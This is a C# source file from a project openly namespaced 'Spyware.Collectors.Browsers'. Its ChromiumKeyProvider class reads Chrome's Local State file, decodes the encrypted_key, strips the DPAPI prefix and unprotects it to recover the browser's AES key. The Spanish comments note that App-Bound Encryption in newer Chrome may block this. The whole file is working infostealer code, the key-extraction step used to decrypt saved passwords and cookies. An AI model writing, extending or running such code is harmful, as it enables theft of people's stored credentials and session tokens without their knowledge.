using System.Text;
using System.Text.Json;
using Spyware.Core.Logging;
using Spyware.Core.Security;

namespace Spyware.Collectors.Browsers;

public record KeyResult(byte[]? AesKey, string? Failure);

/// <summary>
/// Lee Local State y reconstruye la clave AES de 32 bytes.
/// Solo lectura/descifrado: no se escribe nada en el navegador.
/// </summary>
public static class ChromiumKeyProvider
{
    private static readonly byte[] DpapiPrefix = Encoding.ASCII.GetBytes("DPAPI");

    public static KeyResult TryGetKey(string localStatePath, ILog log)
    {
        try
        {
            using JsonDocument document = JsonDocument.Parse(File.ReadAllText(localStatePath));

            if (!document.RootElement.TryGetProperty("os_crypt", out JsonElement osCrypt) ||
                !osCrypt.TryGetProperty("encrypted_key", out JsonElement encryptedKeyElement))
            {
                return new KeyResult(null, "os_crypt_missing");
            }

            string? encoded = encryptedKeyElement.GetString();
            if (string.IsNullOrWhiteSpace(encoded))
                return new KeyResult(null, "encrypted_key_empty");

            byte[] blob = HashHelper.FromBase64(encoded);
            if (blob.Length > DpapiPrefix.Length && StartsWith(blob, DpapiPrefix))
                blob = blob[DpapiPrefix.Length..];
            else
                return new KeyResult(null, "unexpected_key_format");

            if (!DpapiHelper.TryUnprotect(blob, out byte[] aesKey))
            {
                // Chrome 127+ puede usar App-Bound Encryption: la clave ya no es
                // desprotegible desde un proceso externo normal.
                log.Warn("DPAPI no pudo desproteger la clave de Chrome (posible App-Bound Encryption).");
                return new KeyResult(null, "key_app_bound_or_blocked");
            }

            if (aesKey.Length != 32)
                return new KeyResult(null, $"unexpected_key_length_{aesKey.Length}");

            log.Debug($"Clave AES de navegador obtenida ({aesKey.Length} bytes).");
            return new KeyResult(aesKey, null);
        }
        catch (Exception ex)
        {
            log.Debug("Lectura de Local State falló: " + ex.Message);
            return new KeyResult(null, "local_state_error:" + ex.GetType().Name);
        }
    }

    private static bool StartsWith(byte[] data, byte[] prefix)
    {
        for (int i = 0; i < prefix.Length; i++)
            if (data[i] != prefix[i]) return false;

        return true;
    }
}
